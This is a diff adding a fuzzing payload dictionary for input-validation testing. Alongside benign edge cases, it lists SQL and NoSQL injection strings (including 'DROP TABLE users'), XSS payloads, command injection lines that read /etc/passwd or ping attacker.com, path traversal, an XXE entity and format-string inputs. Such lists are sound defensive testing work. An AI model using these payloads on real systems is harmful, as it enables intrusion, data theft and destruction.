@@ -1,0 +1,151 @@
+# AIDA-RED Fuzzing Payload Dictionary
+# These are test inputs for finding edge cases in input validation
+# Each line is a test payload - use responsibly in controlled environments only
+
+# Empty and whitespace
+""
+
+
+
+
+# Boundary integers
+0
+-1
+1
+-0
+2147483647
+-2147483648
+2147483648
+-2147483649
+9999999999999999
+-9999999999999999
+
+# Floating point
+0.0
+-0.0
+0.1
+-0.1
+1e308
+-1e308
+1e-308
+NaN
+Infinity
+-Infinity
+
+# Special strings
+null
+NULL
+Null
+undefined
+nil
+None
+true
+false
+True
+False
+TRUE
+FALSE
+
+# SQL injection patterns (for testing SQL injection protection)
+' OR '1'='1
+" OR "1"="1
+'; DROP TABLE users; --
+1; DROP TABLE users
+1 OR 1=1
+' UNION SELECT * FROM users --
+
+# NoSQL injection patterns
+{"$gt": ""}
+{"$ne": null}
+{"$where": "1==1"}
+
+# XSS patterns (for testing XSS protection)
+<script>alert('xss')</script>
+<img src=x onerror=alert('xss')>
+<svg onload=alert('xss')>
+javascript:alert('xss')
+<body onload=alert('xss')>
+
+# Command injection patterns (for testing command injection protection)
+; ls -la
+| cat /etc/passwd
+`whoami`
+$(id)
+& ping -c 1 attacker.com
+
+# Path traversal patterns
+../../../etc/passwd
+..\\..\\..\\windows\\system32
+....//....//etc/passwd
+%2e%2e%2f%2e%2e%2f
+
+# Unicode edge cases
+\u0000
+\u200B
+\uFEFF
+\u202E
+\uD800
+\uDFFF
+\uFFFD
+
+# Unicode homoglyphs
+admin (with Cyrillic а: \u0430dmin)
+test (with Cyrillic е: t\u0435st)
+
+# Long strings
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+# Repeat 1000 times: AAAA...
+
+# Format strings
+%s%s%s%s%s
+%x%x%x%x%x
+%n%n%n%n%n
+{0}{1}{2}
+
+# JSON edge cases
+{}
+[]
+{"":""}
+{"a":null}
+{"a":undefined}
+[null,null,null]
+{"a":{"b":{"c":{"d":{"e":"deep"}}}}}
+
+# XML edge cases
+<root></root>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY bar "baz">]>
+
+# Date/Time edge cases
+0000-00-00
+9999-12-31
+2000-02-30
+1970-01-01T00:00:00Z
+-0001-01-01
+
+# Email edge cases
+test@test
+@test.com
+test@
+test@.com
+test@test..com
+very.long.email.address.that.exceeds.normal.limits@example.com
+
+# Phone number edge cases
+0000000000
++00000000000
+123
+++1234567890
+
+# Credit card patterns (test numbers only)
+4111111111111111
+5500000000000004
+340000000000009
+
+# Binary/Encoded
+%00
+\x00
+\0
+\n\r\t
+base64://dGVzdA==
+data:text/html,<script>alert(1)</script>
